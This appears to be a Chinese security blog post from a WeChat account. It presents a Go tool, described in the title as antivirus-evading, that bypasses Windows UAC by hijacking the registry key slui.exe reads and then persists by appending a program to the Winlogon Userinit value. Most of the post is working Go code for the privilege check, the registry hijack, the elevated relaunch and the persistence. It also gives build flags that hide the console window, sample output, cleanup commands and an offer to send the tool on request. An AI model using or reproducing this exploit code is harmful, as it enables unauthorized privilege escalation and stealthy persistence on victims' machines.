---
title: 基于slui 实现UAC bypass免杀添加计划任务
url: https://mp.weixin.qq.com/s/QZal94K2vIA1nf28kG_G7Q
source: Doonsec's feed
date: 2026-03-02
fetch_date: 2026-03-03T04:10:59.499602
---

# 基于slui 实现UAC bypass免杀添加计划任务

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/icLvb37WXsakXklmZ1BtFfsurTCTsOqGaZ2HmEiaicylbHq7q0eITeicBEic8Ig90sNHqwW4iamZaCicictBuBRrIibD6oE2UPIibtBZw2wOE6Cgzbe1c/0?wx_fmt=jpeg)

# 基于slui 实现UAC bypass免杀添加计划任务

原创

hyyrent
hyyrent

0xSecurity

![]()

在小说阅读器中沉浸阅读

## 前言

结合 **slui.exe 注册表劫持绕过 UAC** 和 **Winlogon Userinit 注册表持久化**，实现无 UAC 弹窗运行任意程序，并在每次用户登录时自动执行

![image-20260302174246253](https://mmbiz.qpic.cn/mmbiz_png/icLvb37WXsakC6mhap0XKk0g1ZG7BHG0icw9k5BMLqZiaVCZQPtTkovJwvicXZV9noOBLWbzvdKkU5f41hkc7DGibOOmicu2icFejrib0h7IK2Q5Loo/640?wx_fmt=png&from=appmsg)

## 功能

* UAC Bypass — 利用 `slui.exe` 自动提权机制绕过 UAC
* 权限检测 — 查询进程 Token 判断当前权限
* 登录持久化 — 劫持 Winlogon Userinit 注册表实现开机自启
* 自重启机制 — 自动以管理员权限重启自身完成完整攻击链

## 技术分析

### 一、权限检测 — `IsElevated()`

通过 `OpenProcessToken` 打开当前进程 Token，查询 `TokenElevation` 判断是否已提权：

```
funcIsElevated() (bool, error) {
    vartokenwindows.Token

    process :=windows.CurrentProcess()
    err :=windows.OpenProcessToken(process, windows.TOKEN_QUERY, &token)
    iferr!=nil {
        returnfalse, fmt.Errorf("OpenProcessToken 失败: %w", err)
    }
    defertoken.Close()

    varelevationuint32
    varsizeuint32
    err=windows.GetTokenInformation(
        token,
        windows.TokenElevation,
        (*byte)(unsafe.Pointer(&elevation)),
        uint32(unsafe.Sizeof(elevation)),
        &size,
    )
    iferr!=nil {
        returnfalse, fmt.Errorf("GetTokenInformation 失败: %w", err)
    }

    returnelevation!=0, nil
}
```

`elevation != 0` 表示当前进程已具备管理员权限。

### 二、UAC Bypass — `Bypass()`

利用 `slui.exe`（Windows 激活界面）的自动提权特性。

`slui.exe` 是微软签名的 auto-elevate 二进制文件，启动时会查找以下注册表路径执行程序：

```
HKCU\Software\Classes\Launcher.SystemSettings\Shell\Open\Command
```

攻击步骤：

**1. 写入注册表键**

将 `DelegateExecute` 设为空值（阻止 COM 代理），将默认值设为自身路径 + 原始参数：

```
funcBypass() error {
    // ...
    if!elevated {
        // 阻止 COM 代理
        CreateRegKey("DelegateExecute", "")

        // 拼接完整命令：自身路径 + 原始参数
        selfExe, _ :=os.Executable()
        fullCmd :=selfExe
        for_, arg :=rangeos.Args[1:] {
            fullCmd+=" "+arg
        }

        // 写入注册表默认值
        CreateRegKey("", fullCmd)
        // ...
    }
}
```

**2. 注册表操作**

在 `HKCU` 下创建键并写入值：

```
funcCreateRegKey(name, valuestring) error {
    keyPath :=`Software\Classes\Launcher.SystemSettings\Shell\Open\Command`

    key, _, err :=registry.CreateKey(registry.CURRENT_USER, keyPath, registry.SET_VALUE)
    iferr!=nil {
        returnfmt.Errorf("创建注册表键失败: %w", err)
    }
    deferkey.Close()

    iferr :=key.SetStringValue(name, value); err!=nil {
        returnfmt.Errorf("设置注册表值 '%s' 失败: %w", name, err)
    }
    returnnil
}
```

**3. 触发 slui.exe**

通过 `ShellExecuteW` 启动 `slui.exe`，它会自动提权并读取被劫持的注册表键，以管理员权限执行 `go_uac.exe <target>`：

```
funcRunAsAdmin(executablestring) error {
    verbPtr, _ :=syscall.UTF16PtrFromString("runas")
    exePtr, _ :=syscall.UTF16PtrFromString(executable)

    ret, _, _ :=procShellExecute.Call(
        0,
        uintptr(unsafe.Pointer(verbPtr)),
        uintptr(unsafe.Pointer(exePtr)),
        0,
        0,
        uintptr(swShow),
    )

    ifret<=32 {
        returnfmt.Errorf("ShellExecuteW 失败，返回值: %d", ret)
    }
    returnnil
}
```

**4. 原进程退出**

slui.exe 触发后原进程立即退出，新的 go\_uac.exe 以管理员权限启动并继续执行后续步骤：

```
RunAsAdmin(`C:\Windows\System32\slui.exe`)
fmt.Println("[+] 已触发提权，等待以管理员权限重启...")
os.Exit(0)
```

### 三、持久化 — `Persist()`

利用 Winlogon Userinit 注册表劫持实现登录自启动。`Userinit` 值指定用户登录时执行的程序，默认为 `userinit.exe`，通过追加目标程序路径实现持久化：

```
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
```

```
funcPersist(targetExestring) error {
    keyPath :=`SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

    key, err :=registry.OpenKey(registry.LOCAL_MACHINE, keyPath,
        registry.QUERY_VALUE|registry.SET_VALUE)
    iferr!=nil {
        returnfmt.Errorf("打开 Winlogon 注册表键失败: %w", err)
    }
    deferkey.Close()

    // 读取当前 Userinit 值
    userinit, _, err :=key.GetStringValue("Userinit")
    iferr!=nil {
        userinit=`C:\Windows\system32\userinit.exe,`
    }

    // 避免重复添加
    ifstrings.Contains(userinit, targetExe) {
        returnnil
    }

    // 追加目标路径（逗号分隔）
    newUserinit :=strings.TrimRight(userinit, ",") +","+targetExe
    iferr :=key.SetStringValue("Userinit", newUserinit); err!=nil {
        returnfmt.Errorf("设置 Userinit 注册表值失败: %w", err)
    }
    returnnil
}
```

写入后注册表值变为：

```
原始值: C:\Windows\system32\userinit.exe,
劫持后: C:\Windows\system32\userinit.exe,C:\path\to\target.exe
```

每次用户登录时，Windows 会依次执行所有 Userinit 中列出的程序

### 输出示例

```
[+] Executing UAC Bypass
[+] 已触发提权，等待以管理员权限重启...

（以管理员权限重启后）

[+] Already running with elevated privs!
[+] Winlogon Userinit 已劫持: C:\Windows\system32\userinit.exe,C:\Windows\System32\cmd.exe
[*] 程序将在每次用户登录时自动运行
[+] 正在启动: C:\Windows\System32\cmd.exe
[*] Done!
```

### 编译命令

```
gomodtidy
# 隐藏控制台窗口（可选）
gobuild-ldflags="-H windowsgui"-ogo_uac.exe.
```

## 清理恢复

```
# 恢复 Winlogon Userinit 为默认值
Set-ItemProperty"HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"-NameUserinit-Value"C:\Windows\system32\userinit.exe,"

# 删除 UAC bypass 注册表键
Remove-Item"HKCU:\Software\Classes\Launcher.SystemSettings"-Recurse-Force
```

## 免责声明

本工具仅供**教育和授权安全研究**使用。未经授权对非自有系统使用本工具属于违法行为，作者不承担任何滥用责任。

### 关注公众号私信发送 `uacbypass` 获取工具

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/umfmicibSEUbh3njCWzKrGE2uj3jicFkAqjVIHpJKhnC78W3CS7OGrfItJxbfRKCxwY4fNYP1j8ric9Gk8bAun4Cibw/0?wx_fmt=png)

0xSecurity

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/umfmicibSEUbh3njCWzKrGE2uj3jicFkAqjVIHpJKhnC78W3CS7OGrfItJxbfRKCxwY4fNYP1j8ric9Gk8bAun4Cibw/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过